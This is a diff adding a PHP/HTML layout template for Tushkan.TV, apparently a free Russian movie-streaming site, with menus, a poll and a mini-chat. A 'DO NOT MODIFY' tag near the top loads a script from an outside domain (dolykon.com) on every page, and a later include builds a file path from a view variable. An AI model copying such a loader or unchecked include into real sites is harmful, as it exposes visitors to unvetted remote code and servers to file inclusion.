@@ -1,0 +1,395 @@
+<!doctype html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
+    <?php
+    global $news_blocks; $news_blocks = getSeoInfo();
+    echo $this->headTitle();
+    $meta = Zend_Registry::get("meta");
+    echo $meta;
+    echo $this->headLink()->prependStylesheet('/redesign_assets/style.css?ver=28w2eweddw248'); ?>
+    <link href="/redesign_assets/jquery-ui.css" rel="stylesheet">
+    <script src="/redesign_assets/js/vendor/jquery-1.12.0.min.js"></script>
+    <?
+    $user = Zend_Registry::get("user");
+    $memcache = Zend_Registry::get("memcache");
+    $key = 'head_block_banner';
+    if(($result = $memcache->get($key)) === false ) {
+        $head_banner = Model_Banners::getBannerByCat('head_block');
+        $memcache->set($key, $head_banner, false, 0);
+    } else {
+        $head_banner = $result;
+    }
+    echo $head_banner['code'];
+    ?>
+</head>
+<body>
+<!--noindex--><!-- BEGIN TAG - DO NOT MODIFY -->
+<script>(function(){var s=document.createElement('script');s.src='http://dolykon.com/j/w.php?id=MjIw&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+<!-- END TAG --><!--/noindex-->
+    <div class="wrapper">
+        <div class="wrap">
+            <header>
+                <div class="logo-block">
+                    <div class="logo">
+                        <a href=""><img src="/redesign_assets/images/logo.png" alt="Логотип"></a>
+                    </div>
+                    <form action="/search/" method="get">
+                        <input name="q" type="text" placeholder="Поиск фильма">
+                        <input type="submit" value="Искать">
+                        <input type="hidden" name="a" value="45">
+                    </form>
+                    <a class="player">Плеер от тушкана</a>
+                    <div class="enter">
+                        <a href="">Войти</a>
+                        <a href="">Регистрация</a>
+                    </div>
+                </div>
+                <div class="menu-block">
+                    <div class="menu-wrap">
+                        <a href="#" id="pull">Меню</a>
+                        <? echo $this->topMenu(); ?>
+                    </div>
+                    <div class="buttons">
+                        <div data-target="#categories-block-hidden" class="cat-button button-toggle">КАТЕГОРИИ
+                            
+                        </div>  
+                        <!--выпадающее меню навигации -->
+                        <div data-target="#navigation-block-hidden" class="naw-button button-toggle">НАВИГАЦИЯ
+                            <div id="accordion">
+                                <h3>Новинки кино</h3>
+                                <div></div>
+                                <h3>Фильмы в HD</h3>
+                                <div></div>
+                                <h3>Сериалы онлайн</h3>
+                                <div></div>
+                                <h3>По году</h3>
+                                <div>
+                                    <ul class="years">
+                                        <li><a href="/news/tag/2016/1">2016года</a></li>
+                                        <li><a href="/news/tag/2015/1">2015года</a></li>
+                                        <li><a href="/news/tag/2014/1">2014года</a></li>
+                                        <li><a href="/news/tag/2013/1">2013года</a></li>
+                                        <li><a href="/news/tag/2012/1">2012года</a></li>
+                                        <li><a href="/news/tag/2011/1">2011года</a></li>
+                                        <li><a href="/news/tag/2010/1">2010года</a></li>
+                                        <li><a href="/news/tag/2009/1">2009года</a></li>
+                                    </ul>
+                                </div>
+                                <h3>По странам</h3>
+                                <div>
+                                <ul class="countries">
+                                    <li><a href="/news/tag/country_rossiya/1">
+                                        <img src="/redesign_assets/images/russia.png" alt="">&#160;Россия</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_ukraina/1">
+                                        <img src="/redesign_assets/images/ukraine.png" alt="">&#160;Украина</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_ssha/1">
+                                        <img src="/redesign_assets/images/usa.png" alt="">&#160;США</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_kitaj/1">
+                                        <img src="/redesign_assets/images/china.png" alt="">&#160;Китай</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_indiya/1">
+                                        <img src="/redesign_assets/images/india.png" alt="">&#160;Индия</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_italiya/1">
+                                        <img src="/redesign_assets/images/italy.png" alt="">&#160;Италия</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_frantciya/1">
+                                        <img src="/redesign_assets/images/france.png" alt="">&#160;Франция</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_germaniya/1">
+                                        <img src="/redesign_assets/images/germany.png" alt="">&#160;Германия</a>
+                                    </li>
+                                    <li><a href="/news/tag/country_velikobritaniya/1">
+                                        <img src="/redesign_assets/images/great_britan.png" alt="">&#160;Великобритания</a>
+                                    </li>
+                                </ul>
+                                </div>
+                                <h3>ТОП</h3>
+                                <div>
+                                    <ul class="top">
+                                        <li><a href="">По рейтингу</a></li>
+                                        <li><a href="">По просмотрам</a></li>
+                                        <li><a href="">По комментаpиям</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div> <!--выпадающее меню навигации -->
+                    </div>
+                </div>
+                    <div id="categories-block-hidden" class="categories-pop">
+                        <div class="navigation-titles">
+                            <div class="main-titles">КАТЕГОРИИ ФИЛЬМОВ</div>
+                        </div>
+                        
+                        <div class="navigation">
+                            <?
+                            if($this->param_cat == 'publ'){
+                                echo $this->categoriesRight('publ');
+                            }else{
+                                echo $this->categoriesRight('news');
+                            }
+                            ?>
+
+                        </div>
+                    </div>
+                    <div id="navigation-block-hidden" class="navigation-wrap">
+                        <div class="navigation-titles">
+                            <div class="main-titles">НАВИГАЦИЯ</div>
+                        </div>
+                        <div id="accordion-sample" class="navigation">
+                            <h3><a href="/news/tag/novinki_kino/1">Новинки кино</a></h3>
+                            <div></div>
+                            <h3><a href="/news/tag/hd_filmy/1">Фильмы в HD</a></h3>
+                            <div></div>
+                            <h3><a href="/news/serialy/1-0-7">Сериалы онлайн</a></h3>
+                            <div></div>
+                            <h3>По году</h3>
+                            <ul class="years">
+                                <li><a href="/news/tag/2016/1">2016года</a></li>
+                                <li><a href="/news/tag/2015/1">2015года</a></li>
+                                <li><a href="/news/tag/2014/1">2014года</a></li>
+                                <li><a href="/news/tag/2013/1">2013года</a></li>
+                                <li><a href="/news/tag/2012/1">2012года</a></li>
+                                <li><a href="/news/tag/2011/1">2011года</a></li>
+                                <li><a href="/news/tag/2010/1">2010года</a></li>
+                                <li><a href="/news/tag/2009/1">2009года</a></li>
+                            </ul>
+                            <h3>По странам</h3>
+                            <ul class="countries">
+                                <li><a href="/news/tag/country_rossiya/1">
+                                    <img src="/redesign_assets/images/russia.png" alt="">&#160;Россия</a>
+                                </li>
+                                <li><a href="/news/tag/country_ukraina/1">
+                                    <img src="/redesign_assets/images/ukraine.png" alt="">&#160;Украина</a>
+                                </li>
+                                <li><a href="/news/tag/country_ssha/1">
+                                    <img src="/redesign_assets/images/usa.png" alt="">&#160;США</a>
+                                </li>
+                                <li><a href="/news/tag/country_kitaj/1">
+                                    <img src="/redesign_assets/images/china.png" alt="">&#160;Китай</a>
+                                </li>
+                                <li><a href="/news/tag/country_indiya/1">
+                                    <img src="/redesign_assets/images/india.png" alt="">&#160;Индия</a>
+                                </li>
+                                <li><a href="/news/tag/country_italiya/1">
+                                    <img src="/redesign_assets/images/italy.png" alt="">&#160;Италия</a>
+                                </li>
+                                <li><a href="/news/tag/country_frantciya/1">
+                                    <img src="/redesign_assets/images/france.png" alt="">&#160;Франция</a>
+                                </li>
+                                <li><a href="/news/tag/country_germaniya/1">
+                                    <img src="/redesign_assets/images/germany.png" alt="">&#160;Германия</a>
+                                </li>
+                                <li><a href="/news/tag/country_velikobritaniya/1">
+                                    <img src="/redesign_assets/images/great_britan.png" alt="">&#160;Великобритания</a>
+                                </li>
+                            </ul>
+                            <h3>ТОП</h3>
+                            <ul class="top">
+                                <li><a href="/news/top/rating"><img src="/redesign_assets/images/by_rate.png" alt="">&#160;&#160;По рейтингу</a></li>
+                                <li><a href="/news/top/view"><img src="/redesign_assets/images/by_views.png" alt="">&#160;&#160;По просмотрам</a></li>
+                                <li><a href="/news/top/comments"><img src="/redesign_assets/images/by_comments.png" alt="">&#160;&#160;По комментаpиям</a></li>
+                            </ul>
+                        </div>
+                    </div>  
+            </header>
+            <section class="index-first-row">
+                <? echo $this->topFilms(); ?>
+            </section>
+            
+            
+            <?php echo $this->layout()->content; ?>
+            
+            <div class="main-titles">ПОПУЛЯРНЫЕ ФИЛЬМЫ <a href="#">Смотреть больше</a></div>
+            <section class="index-first-row">
+                <? echo $this->popularBlocks('films',10800); ?>
+            </section>
+            <div class="main-titles">ПОПУЛЯРНЫЕ МУЛЬТФИЛЬМЫ <a href="#">Смотреть больше</a></div>
+            <section class="index-first-row">
+                <? echo $this->popularBlocks('mults',10920); ?>
+            </section>
+            <div class="main-titles">ПОПУЛЯРНЫЕ СЕРИАЛЫ <a href="#">Смотреть больше</a></div>
+            <section class="index-first-row">
+                <? echo $this->popularBlocks('serials',10860); ?>
+            </section>
+            <div class="main-titles">ПОПУЛЯРНЫЕ ПЕРЕДАЧИ <a href="#">Смотреть больше</a></div>
+            <section class="index-first-row">
+                <? echo $this->popularBlocks('casts',10980); ?>
+            </section>
+            <div class="main-titles">НОВОСТИ КИНО<a href="#">Смотреть больше</a></div>
+            <section>
+                <div class="news-block">
+                <? echo $this->lastPubls();  ?>
+                </div>
+            </section>
+            <div class="main-titles">ПОСЛЕДНИЕ КОММЕНТАРИИ</div>
+            <section>
+                <div class="news-block">
+                <? echo $this->lastComments(); ?>
+                </div>
+            </section>
+            <section class="interview-section">
+                <div class="interview">
+                <div class="interview-block">ОПРОС</div>
+                <? $pool = Model_Pools::getRandomPool(); $pool = $pool[0]; ?>
+                    <div id="pollBlock<? echo $pool['1']?>">
+
+                        <div class="interview-title"><? echo $pool['7']; ?></div>
+                        <form action="">
+                        <? for($i = 8; $i < 23; $i++) {
+                            if($pool[$i] != ""){ ?>
+                            <label><input 
+                            id="a<? echo $pool['1'].($i-7)?>" 
+                            name="answer" value="<? echo $i-7;?>" 
+                            type="radio"> <? echo $pool[$i]; ?></label><br>
+                        <? }
+                        } ?>
+                            <input type="submit" value="ОТВЕТИТЬ" id="pollSbm<? echo $pool['1']?>">
+                            <input type="hidden" name="ssid" value="773375161021642737502" />
+                            <input type="hidden" name="id" value="43" />
+                            <input type="hidden" name="a" value="1" />
+                            <input type="hidden" name="ajax" value="<? echo $pool['1']?>" />
+                        </form>
+                        <a href="javascript://" rel="nofollow" id_pool="<? echo $pool['1']?>" class="pollLnk-all">Результаты</a>&#160;&#160;&#160;<a href="javascript://" rel="nofollow" class="pollLnk-archive">Архив опросов</a>
+                        <p>Всего ответов <span><? echo $pool['38']?></span></p>
+                    </div>
+                </div>
+                <div class="chat">
+                    <div class="chat-title">МИНИ ЧАТ</div>
+                    <div class="chat-block">
+                        
+                        <tr>
+                <td style="height: 100px; vertical-align: top; letter-spacing: 0px; word-spacing: 0px; padding-left: 5px; padding-right: 5px; border-left: 1px solid rgb(202, 209, 210); border-right: 1px solid rgb(202, 209, 210); background: rgb(255, 255, 255) none repeat scroll 0% 0%;">
+                    <iframe id="mchatIfm2" name="mchat" style="width:100%;height:100%;" frameborder="0" scrolling="auto" hspace="0" vspace="0" allowtransparency="true" src="/index/mchat/"></iframe>
+                    <script type="text/javascript">
+                    function countMessLength(){
+                        var rst = 500-$('#mchatMsgF').val().length;
+                        if (rst<0){
+                            rst=0;
+                            $('#mchatMsgF').val($('#mchatMsgF').val().substr(0,500));
+                        }
+                        $('#jeuwu28').html(rst);
+                    }
+                    </script>
+                    <!--<form style="margin:0;padding:0;" id="MCaddFrm" action="/index/chat">-->
+                    <? if($user->data['is_registered']){?>
+                        <table border="0" cellpadding="1" cellspacing="1" width="100%">
+                            <tbody>
+                            <tr>
+                            <td>
+                            <select id="mchatRSel" class="mchat" size="1" title="Автообновление" style="font-size:7pt;">
+                                <option value="0" <? if($curr_user['refresh_time'] == '0'){echo 'selected="selected"';} ?>>--</option>
+                                <option value="15" <? if($curr_user['refresh_time'] == '15'){echo 'selected="selected"';} ?>>15 сек</option>
+                                <option value="30" <? if($curr_user['refresh_time'] == '30'){echo 'selected="selected"';} ?>>30 сек</option>
+                                <option value="60" <? if($curr_user['refresh_time'] == '60'){echo 'selected="selected"';} ?>>1 мин</option>
+                                <option value="120" <? if($curr_user['refresh_time'] == '120'){echo 'selected="selected"';} ?>>2 мин</option>
+                            </select>
+                            <script>
+                                $(document).ready(function(){
+                                    var param = <? echo $curr_user['refresh_time'] ? $curr_user['refresh_time'] : 0; ?>;
+                                    if(param != 0){
+                                        func_id = setInterval(function(){ refreshChat(); }, param+'000');
+                                        $("#mchatRSel").attr("func_id",func_id);
+                                    }
+                                });
+                            </script>
+                            </td>
+                            <td width="70%" align="right">
+                            <a href="/index/mchat" rel="nofollow" target="mchat" id="refresh_chat" title="Обновить">
+                                <span class="chat_user_mcr"></span>
+                            </a>
+                            &nbsp;<a href="javascript://" rel="nofollow" id="chat_smiles" title="Вставить смайл">
+                                    <span class="chat_user_mcs"></span>
+                                </a>
+                            &nbsp;<a href="javascript://" rel="nofollow" id="chat_bb_codes" title="BB-Коды">
+                                    <span class="chat_user_mcb"></span>
+                                </a>
+                            <? if($user->data['group_id'] == "5" || $user->data['group_id'] == "8"){ ?>
+                            &nbsp;<a href="javascript://" rel="nofollow" id="chat_settings" title="Управление сообщениями">
+                                    <span class="chat_user_mcm"></span>
+                                </a>
+                            <? } ?>
+                            </td>
+                            </tr>
+                            </tbody>
+                        </table>
+                        <table border="0" cellpadding="1" cellspacing="1" width="100%">
+                            <tbody>
+                                <tr>
+                                    <td width="95%" rowspan="2">
+                                        <textarea name="mcmessage" class="mchat" id="mchatMsgF" title="Сообщение" onkeyup="countMessLength();" onfocus="countMessLength();" style="height:40px;width:100%;resize:none;"></textarea>
+                                    </td>
+                                    <td align="center" valign="top">
+                                        <div style="font-size:10px;"><b id="jeuwu28">500</b></div>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td align="center" valign="bottom">
+                                        <div style="width:30px">
+                                            <input type="submit" value="OK" class="mchat" id="mchatBtn" style="width:30px;">
+                                            <img alt="" style="display:none;" id="mchatAjax" src="/img/ajax3.gif" border="0" width="16">
+                                        </div>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    <? }else{?>
+                        <div align="center">
+                            <a href="javascript://" class="login_popup" rel="nofollow">Для добавления необходима авторизация</a>
+                        </div>
+                        <input type="hidden" name="numa" id="numa832" value="0"><input type="hidden" name="a" value="18"><input type="hidden" id="ajaxFlag" name="ajax" value="1">
+                    <?}?>
+                    <!--</form>-->
+                </td>
+            </tr>
+            <tr style="height: 11px; letter-spacing: 0px; word-spacing: 0px; background-image: url(&quot;/images/buttons/bottom_chat.png&quot;); background-repeat: no-repeat; background-position: 50% 0%">
+                <td></td>
+            </tr>
+
+                    </div>
+                        
+
+
+
+
+
+                </div>
+            </section>
+            <div class="above-footer-main-titles">СМОТРЕТЬ КИНО ОНЛАЙН БЕСПЛАТНО, ФИЛЬМЫ ОНЛАЙН СМОТРЕТЬ НА ТУШКАНЕ
+            </div>
+            <section class="above-footer-main">
+                    <p><?php
+                    if(!$this->page_number || $this->page_number < 2) {
+                        if($news_blocks !== null && !empty($news_blocks['title_down'])) {
+                            echo $news_blocks['title_down'];
+                        } else if(isset($_REQUEST['tagpage']) && !empty($this->h2) && file_exists(__DIR__.'/../modules/default/views/scripts/news/tags/'.$this->h2.'.php')) {
+                            include __DIR__.'/../modules/default/views/scripts/news/tags/'.$this->h2.'.php';
+                        }
+                    }
+                    ?></p>
+            </section>
+        </div>
+        <footer>
+            <ul class="footer-menu">
+                <li><a href="/index/dlja_pravoobladatelej/0-48">Контакты</a></li>
+                <li><a href="/sitemap.xml">Карта сайта</a></li>
+                <li><a href="/sitemap-forum.xml">Карта форума</a></li>
+                <li><a href="/news/rss/ ">RSS</a></li>
+                <li><a href="/news/allserials">Все сериалы на Tushkan.TV</a></li>
+                <li><a href="/forum/">Форум</a></li>
+            </ul>
+            <div class="coperite">Copyright <a href="/">Tushkan.TV</a> © 2010-2016</div>
+        </footer>
+    </div>
+    
+    <script src="/redesign_assets/jquery-ui-1.11.4.custom/jquery-ui.js"></script>
+    <script src="/redesign_assets/js/main.js?2198332"></script>
+    <script src="/redesign_assets/js/fancySelect.js?219831"></script>
+</body>
+</html>
